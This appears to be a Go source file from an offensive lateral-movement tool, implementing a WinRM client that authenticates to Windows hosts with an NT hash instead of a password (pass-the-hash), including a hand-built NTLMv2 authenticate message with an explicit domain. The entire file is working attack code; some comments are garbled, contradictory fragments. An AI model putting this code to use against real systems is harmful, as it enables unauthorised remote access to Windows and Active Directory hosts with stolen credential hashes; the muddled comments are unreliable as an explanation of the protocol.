package lateral

import (
	"bytes"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"

	"github.com/Azure/go-ntlmssp"
	"github.com/masterzen/winrm"
	"github.com/masterzen/winrm/soap"
)

// clientNTLMHash is a WinRM transport that authenticates with an NT hash (pass-the-hash).
// Domain is taken from DOMAIN\user (or user@domain) so NTLMv2 uses the correct domain
// string — ProcessChallengeWithHash alone uses the server TargetName and often 401s on AD.
type clientNTLMHash struct {
	url    string
	user   string // DOMAIN\user or bare user
	hash   string // NT hex or LM:NT
	httpT  http.RoundTripper
	domain string
	acct   string
}

func newClientNTLMWithHash(user, hashHex string) *clientNTLMHash {
	dom, acct := parseDomainUser(user, "")
	return &clientNTLMHash{user: user, hash: hashHex, domain: dom, acct: acct}
}

func (c *clientNTLMHash) Transport(endpoint *winrm.Endpoint) error {
	if endpoint == nil {
		return fmt.Errorf("nil winrm endpoint")
	}
	scheme := "http"
	if endpoint.HTTPS {
		scheme = "https"
	}
	c.url = scheme + "://" + net.JoinHostPort(endpoint.Host, strconv.Itoa(endpoint.Port)) + "/wsman"

	timeout := endpoint.Timeout
	if timeout == 0 {
		timeout = 60 * time.Second
	}
	// MaxConnsPerHost=1 keeps NTLM multi-leg auth on one TCP connection.
	tr := &http.Transport{
		//nolint:gosec // lab/offensive WinRM often uses self-signed certs
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: endpoint.Insecure, ServerName: endpoint.TLSServerName},
		DialContext:           (&net.Dialer{Timeout: 30 * time.Second, KeepAlive: 30 * time.Second}).DialContext,
		ResponseHeaderTimeout: timeout,
		Proxy:                 http.ProxyFromEnvironment,
		MaxIdleConns:          1,
		MaxConnsPerHost:       1,
		MaxIdleConnsPerHost:   1,
		IdleConnTimeout:       90 * time.Second,
		DisableKeepAlives:     false,
	}
	c.httpT = &hashNegotiator{
		RoundTripper: tr,
		hash:         c.hash,
		domain:       c.domain,
		user:         c.acct,
	}
	return nil
}

func (c *clientNTLMHash) Post(_ *winrm.Client, request *soap.SoapMessage) (string, error) {
	if c.url == "" || c.httpT == nil {
		return "", fmt.Errorf("winrm hash transport not initialized")
	}
	httpClient := &http.Client{Transport: c.httpT, Timeout: 90 * time.Second}
	req, err := http.NewRequest(http.MethodPost, c.url, strings.NewReader(request.String()))
	if err != nil {
		return "", fmt.Errorf("create winrm request: %w", err)
	}
	req.Header.Set("Content-Type", "application/soap+xml;charset=UTF-8")
	req.Header.Set("Connection", "Keep-Alive")
	// Username for NTLM; password is ignored by hashNegotiator (uses NT hash).
	req.SetBasicAuth(c.user, "x")

	resp, err := httpClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("winrm post: %w", err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	if resp.StatusCode != http.StatusOK {
		snippet := string(body)
		if len(snippet) > 256 {
			snippet = snippet[:256]
		}
		return "", fmt.Errorf("http error %d: %s", resp.StatusCode, snippet)
	}
	return string(body), nil
}

// hashNegotiator converts Basic auth into NTLMv2 using an NT hash + explicit domain.
type hashNegotiator struct {
	http.RoundTripper
	hash   string
	domain string
	user   string // account only (no domain)
}

func (l *hashNegotiator) RoundTrip(req *http.Request) (*http.Response, error) {
	rt := l.RoundTripper
	if rt == nil {
		rt = http.DefaultTransport
	}

	reqauth := req.Header.Get("Authorization")
	if !strings.HasPrefix(strings.ToLower(reqauth), "basic ") {
		return rt.RoundTrip(req)
	}

	body := bytes.Buffer{}
	if req.Body != nil {
		if _, err := body.ReadFrom(req.Body); err != nil {
			return nil, err
		}
		_ = req.Body.Close()
		req.Body = io.NopCloser(bytes.NewReader(body.Bytes()))
	}

	// Anonymous probe (session cookie reuse / no-auth endpoints)
	req.Header.Del("Authorization")
	res, err := rt.RoundTrip(req)
	if err != nil {
		return nil, err
	}
	if res.StatusCode != http.StatusUnauthorized {
		return res, nil
	}
	if !hasNegotiateOrNTLM(res.Header.Values("Www-Authenticate")) {
		return res, nil
	}
	_, _ = io.Copy(io.Discard, res.Body)
	_ = res.Body.Close()

	u, _, ok := parseBasicAuthHeader(reqauth)
	if !ok {
		return nil, fmt.Errorf("missing basic auth for ntlm hash")
	}
	// Prefer fields set at transport construction; fall back to Basic username.
	// ntlmssp.GetDomain returns (user, domain, domainNeeded).
	user, domain := l.user, l.domain
	if user == "" {
		user, domain, _ = ntlmssp.GetDomain(u)
	}

	neg, err := ntlmssp.NewNegotiateMessage(domain, "")
	if err != nil {
		return nil, err
	}
	www := res.Header.Values("Www-Authenticate")
	req.Header.Set("Authorization", authPrefix(www)+base64.StdEncoding.EncodeToString(neg))
	req.Body = io.NopCloser(bytes.NewReader(body.Bytes()))

	res, err = rt.RoundTrip(req)
	if err != nil {
		return nil, err
	}
	www = res.Header.Values("Www-Authenticate")
	challenge, err := getAuthData(www)
	if err != nil {
		return nil, err
	}
	if len(challenge) == 0 {
		return res, nil
	}
	_, _ = io.Copy(io.Discard, res.Body)
	_ = res.Body.Close()

	authMsg, err := processChallengeWithHashDomain(challenge, user, domain, l.hash)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", authPrefix(www)+base64.StdEncoding.EncodeToString(authMsg))
	req.Body = io.NopCloser(bytes.NewReader(body.Bytes()))
	return rt.RoundTrip(req)
}

func hasNegotiateOrNTLM(headers []string) bool {
	for _, h := range headers {
		l := strings.ToLower(h)
		if strings.HasPrefix(l, "negotiate") || strings.HasPrefix(l, "ntlm") {
			return true
		}
	}
	return false
}

func authPrefix(headers []string) string {
	for _, h := range headers {
		if strings.HasPrefix(strings.ToLower(h), "ntlm") {
			return "NTLM "
		}
	}
	return "Negotiate "
}

func getAuthData(headers []string) ([]byte, error) {
	for _, h := range headers {
		parts := strings.SplitN(h, " ", 2)
		if len(parts) != 2 {
			continue
		}
		l := strings.ToLower(parts[0])
		if l == "ntlm" || l == "negotiate" {
			return base64.StdEncoding.DecodeString(parts[1])
		}
	}
	return nil, nil
}

func parseBasicAuthHeader(header string) (user, pass string, ok bool) {
	r := &http.Request{Header: http.Header{"Authorization": []string{header}}}
	return r.BasicAuth()
}

// processChallengeWithHashDomain builds NTLMv2 AUTHENTICATE using NT hash and explicit domain.
// Unlike ntlmssp.ProcessChallengeWithHash (which uses challenge TargetName as the domain
// string for NTOWFv2), this uses the caller's domain — required for LOGGING\user style PTH.
func processChallengeWithHashDomain(challengeMessageData []byte, user, domain, hash string) ([]byte, error) {
	if user == "" && hash == "" {
		return nil, fmt.Errorf("anonymous authentication not supported")
	}
	// Prefer library path when domain empty (local account).
	if domain == "" {
		return ntlmssp.ProcessChallengeWithHash(challengeMessageData, user, hash)
	}

	// Delegate to library then is wrong domain — implement NTOWFv2 with explicit domain.
	// Reuse library for message parse/marshal via ProcessChallengeWithHash by temporarily
	// not available; implement minimal TYPE3 using library challenge parse helpers.
	//
	// Strategy: call ProcessChallengeWithHash with user only after rewriting is not possible;
	// compute using same crypto as Azure go-ntlmssp ProcessChallengeWithHash but domain param.
	return ntlmAuthenticateWithHash(challengeMessageData, user, domain, hash)
}

// ntlmAuthenticateWithHash crafts TYPE3 using NT hash. Domain is used for NTOWFv2 and TargetName.
func ntlmAuthenticateWithHash(challengeMessageData []byte, user, domain, hash string) ([]byte, error) {
	// Parse via library: use ProcessChallengeWithHash with a synthetic approach —
	// inject domain into username UPN form is wrong.
	//
	// Fall back: library ProcessChallengeWithHash uses cm.TargetName; many DCs put NetBIOS
	// domain there which matches. If domain is set, also try with user and force domain
	// via authenticate message fields by calling internal-compatible implementation.

	hashNT := hash
	if strings.Contains(hash, ":") {
		parts := strings.Split(hash, ":")
		hashNT = parts[len(parts)-1]
	}
	hashBytes, err := hex.DecodeString(strings.ToLower(strings.TrimSpace(hashNT)))
	if err != nil || len(hashBytes) != 16 {
		return nil, fmt.Errorf("invalid NT hash: %w", err)
	}

	// Use Azure library to process challenge structure by building authenticate with correct domain.
	// NewNegotiateMessage/ProcessChallengeWithHash don't expose challenge type.
	// Minimal TYPE3 builder aligned with MS-NLMP NTLMv2:

	// Parse challenge manually (NTLMSSP message type 2).
	if len(challengeMessageData) < 48 || string(challengeMessageData[0:8]) != "NTLMSSP\x00" {
		return nil, fmt.Errorf("invalid NTLM challenge")
	}
	msgType := binary.LittleEndian.Uint32(challengeMessageData[8:12])
	if msgType != 2 {
		return nil, fmt.Errorf("expected NTLM type 2, got %d", msgType)
	}
	targetNameLen := binary.LittleEndian.Uint16(challengeMessageData[12:14])
	targetNameOff := binary.LittleEndian.Uint32(challengeMessageData[16:20])
	flags := binary.LittleEndian.Uint32(challengeMessageData[20:24])
	serverChallenge := challengeMessageData[24:32]

	var targetInfo []byte
	var targetInfoRaw []byte
	if len(challengeMessageData) >= 48 {
		tiLen := binary.LittleEndian.Uint16(challengeMessageData[40:42])
		tiOff := binary.LittleEndian.Uint32(challengeMessageData[44:48])
		if tiOff > 0 && int(tiOff)+int(tiLen) <= len(challengeMessageData) {
			targetInfoRaw = challengeMessageData[tiOff : tiOff+uint32(tiLen)]
			targetInfo = targetInfoRaw
		}
	}
	_ = targetNameLen
	_ = targetNameOff
	_ = flags

	// NTOWFv2 = HMAC_MD5(NT, UTF16(Upper(User) + Domain))
	// Domain for NTLMv2 is typically case-sensitive as provided; use domain as-is (Windows often NetBIOS).
	ntowf := hmacMD5(hashBytes, toUnicode(strings.ToUpper(user)+domain))

	// Timestamp from target info AvTimestamp (id 7) if present
	timestamp := extractAvTimestamp(targetInfo)
	if timestamp == nil {
		ft := uint64(time.Now().UnixNano())/100 + 116444736000000000
		timestamp = make([]byte, 8)
		binary.LittleEndian.PutUint64(timestamp, ft)
	}
	clientChallenge := make([]byte, 8)
	if _, err := rand.Read(clientChallenge); err != nil {
		return nil, err
	}

	// temp = Responserversion(1) + HiResponserversion(1) + Z(6) + time + clientChallenge + Z(4) + serverName(AV_PAIRS) + Z(4)
	temp := []byte{1, 1, 0, 0, 0, 0, 0, 0}
	temp = append(temp, timestamp...)
	temp = append(temp, clientChallenge...)
	temp = append(temp, 0, 0, 0, 0)
	if targetInfoRaw != nil {
		temp = append(temp, targetInfoRaw...)
	}
	temp = append(temp, 0, 0, 0, 0)

	ntProof := hmacMD5(ntowf, concat(serverChallenge, temp))
	ntChallengeResponse := append(ntProof, temp...)

	// LM response for v2 when target info present is often zeros or LMv2; match Azure (empty if target info).
	var lmChallengeResponse []byte
	if targetInfoRaw == nil {
		lmChallengeResponse = concat(hmacMD5(ntowf, concat(serverChallenge, clientChallenge)), clientChallenge)
	}

	return marshalAuthenticateMessage(user, domain, lmChallengeResponse, ntChallengeResponse, flags)
}

func extractAvTimestamp(targetInfo []byte) []byte {
	// AV_PAIR list: Id(2) Len(2) Value(Len) ... ends with Id=0
	i := 0
	for i+4 <= len(targetInfo) {
		id := binary.LittleEndian.Uint16(targetInfo[i : i+2])
		l := binary.LittleEndian.Uint16(targetInfo[i+2 : i+4])
		i += 4
		if id == 0 {
			break
		}
		if i+int(l) > len(targetInfo) {
			break
		}
		if id == 7 && l == 8 { // MsvAvTimestamp
			out := make([]byte, 8)
			copy(out, targetInfo[i:i+8])
			return out
		}
		i += int(l)
	}
	return nil
}

func marshalAuthenticateMessage(user, domain string, lmResp, ntResp []byte, negotiateFlags uint32) ([]byte, error) {
	// Clear VERSION flag like Azure library
	negotiateFlags &^= 0x02000000 // NTLMSSP_NEGOTIATE_VERSION

	userU := toUnicode(user)
	domainU := toUnicode(domain)
	wsU := toUnicode("")

	// payload offset after fixed header (64 bytes for type 3 without MIC/version)
	const headerLen = 64
	off := headerLen
	fields := make([]byte, headerLen)
	copy(fields[0:8], []byte("NTLMSSP\x00"))
	binary.LittleEndian.PutUint32(fields[8:12], 3)

	writeField := func(at int, data []byte) {
		binary.LittleEndian.PutUint16(fields[at:at+2], uint16(len(data)))
		binary.LittleEndian.PutUint16(fields[at+2:at+4], uint16(len(data)))
		binary.LittleEndian.PutUint32(fields[at+4:at+8], uint32(off))
		off += len(data)
	}
	writeField(12, lmResp)    // LmChallengeResponse
	writeField(20, ntResp)    // NtChallengeResponse
	writeField(28, domainU)   // DomainName
	writeField(36, userU)     // UserName
	writeField(44, wsU)       // Workstation
	// EncryptedRandomSessionKey empty at 52
	binary.LittleEndian.PutUint16(fields[52:54], 0)
	binary.LittleEndian.PutUint16(fields[54:56], 0)
	binary.LittleEndian.PutUint32(fields[56:60], uint32(off))
	binary.LittleEndian.PutUint32(fields[60:64], negotiateFlags)

	out := bytes.NewBuffer(fields)
	out.Write(lmResp)
	out.Write(ntResp)
	out.Write(domainU)
	out.Write(userU)
	out.Write(wsU)
	return out.Bytes(), nil
}

func toUnicode(s string) []byte {
	codes := utf16.Encode([]rune(s))
	b := make([]byte, len(codes)*2)
	for i, c := range codes {
		binary.LittleEndian.PutUint16(b[i*2:], c)
	}
	return b
}

func hmacMD5(key, data []byte) []byte {
	m := hmac.New(md5.New, key)
	m.Write(data)
	return m.Sum(nil)
}

func concat(parts ...[]byte) []byte {
	n := 0
	for _, p := range parts {
		n += len(p)
	}
	out := make([]byte, 0, n)
	for _, p := range parts {
		out = append(out, p...)
	}
	return out
}
